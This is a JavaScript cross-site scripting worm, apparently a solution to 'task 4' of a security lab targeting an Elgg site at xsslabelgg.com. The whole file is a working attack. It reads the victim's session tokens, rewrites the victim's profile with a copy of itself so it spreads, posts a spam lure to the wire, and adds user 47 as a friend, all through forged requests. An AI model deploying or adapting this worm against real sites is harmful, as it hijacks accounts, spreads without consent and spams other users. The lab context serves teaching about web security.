//task 4
<script id=worm>
	// this is the combination of first three task
	var headerTag = "<script id=worm>";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

	window.onload = function(){
	var ts="__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var username=elgg.session.user.username
	var userguid=elgg.session.user.guid
	var sendurl="http://www.xsslabelgg.com/action/profile/edit";
	var content=ts+token+"&description="+wormCode+"&guid="+userguid+"&name="+username;

	var postText="To+earn+12+USD%2FHour%28%21%29%2C%0D%0Avisit+now%3A+http%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2F"+username; 
	var sendurl1="http://www.xsslabelgg.com/action/thewire/add"; //FILL IN
	var content1=ts+token+"&body="+postText;

	var sendurl2="http://www.xsslabelgg.com/action/friends/add?friend=47&"+ts+token+"&"+ts+token;

	if(elgg.session.user.guid!=47||elgg.page_owner.guid!=userguid)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}

	if(elgg.session.user.guid!=47||elgg.page_owner.guid!=userguid)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl1,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content1);
	}

	if(elgg.session.user.guid!=47||elgg.page_owner.guid!=userguid){
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl2,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();
	}

	}
	// alert(jsCode);
	//console.log(jsCode);
</script>
